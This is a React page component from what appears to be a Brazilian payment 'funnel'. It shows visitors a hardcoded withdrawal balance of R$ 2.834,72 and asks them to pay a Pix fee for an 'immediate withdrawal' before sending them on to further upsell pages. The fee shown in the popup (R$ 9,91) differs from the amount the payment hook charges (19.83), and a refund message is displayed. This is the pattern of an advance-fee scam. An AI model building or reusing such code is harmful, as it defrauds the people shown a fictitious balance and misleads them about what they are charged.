import { useCallback } from "react";
import { Link, useNavigate, useLocation } from "react-router-dom";
import { ArrowLeft, ArrowRight } from "lucide-react";
import FunnelUpsellSaqueImediato from "@/components/funnel/FunnelUpsellSaqueImediato";
import FunnelProcessingScreen from "@/components/funnel/FunnelProcessingScreen";
import { FunnelPixPopup } from "@/components/funnel";
import { usePaymentFlow } from "@/hooks/usePaymentFlow";

interface LocationState { pixKey?: string; pixKeyType?: string; }

const FunnelUpsellSaqueImediatoPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const state = location.state as LocationState | null;
  const leadPixKey = state?.pixKey || "";
  const leadPixKeyType = state?.pixKeyType || "E-mail";

  const handleProcessingComplete = useCallback(() => {
    navigate('/funil/upsell-anti-erros', { state: { pixKey: leadPixKey, pixKeyType: leadPixKeyType } });
  }, [navigate, leadPixKey, leadPixKeyType]);

  const flow = usePaymentFlow({
    contentId: 'upsell_saque_imediato',
    paymentType: 'upsell_saque_imediato',
    amount: 19.83,
    onProcessingComplete: handleProcessingComplete,
  });

  if (flow.showProcessing) {
    return <FunnelProcessingScreen onComplete={handleProcessingComplete} />;
  }

  return (
    <div className="min-h-screen bg-[#FFF5F0]">
      <div className="fixed top-14 left-4 right-4 z-[90] flex justify-between">
        <Link to="/funil/upsell-anti-reversao" state={{ pixKey: leadPixKey, pixKeyType: leadPixKeyType }} className="flex items-center gap-1 text-white text-sm bg-black/30 px-3 py-1 rounded-full">
          <ArrowLeft className="w-4 h-4" /> Anterior
        </Link>
        <Link to="/funil/upsell-anti-erros" state={{ pixKey: leadPixKey, pixKeyType: leadPixKeyType }} className="flex items-center gap-1 text-white text-sm bg-black/30 px-3 py-1 rounded-full">
          Próximo <ArrowRight className="w-4 h-4" />
        </Link>
      </div>
      <FunnelUpsellSaqueImediato
        balance="R$ 2.834,72"
        onGeneratePix={() => flow.handleGeneratePix(leadPixKey, leadPixKeyType)}
        isGenerating={flow.isGenerating}
        leadCpf={flow.leadCpf}
        leadName={flow.leadName}
      />

      {flow.showPixPopup && flow.pixData && (
        <FunnelPixPopup
          pixData={flow.pixData}
          onClose={() => flow.setShowPixPopup(false)}
          onCopy={flow.handleCopyPixCode}
          isCopied={flow.pixCopied}
          title="Saque Imediato"
          amount="R$ 9,91"
          showRefundMessage
          onManualCheck={flow.checkPayment}
          isCheckingPayment={flow.isChecking}
          checkError={flow.checkError}
        />
      )}
    </div>
  );
};

export default FunnelUpsellSaqueImediatoPage;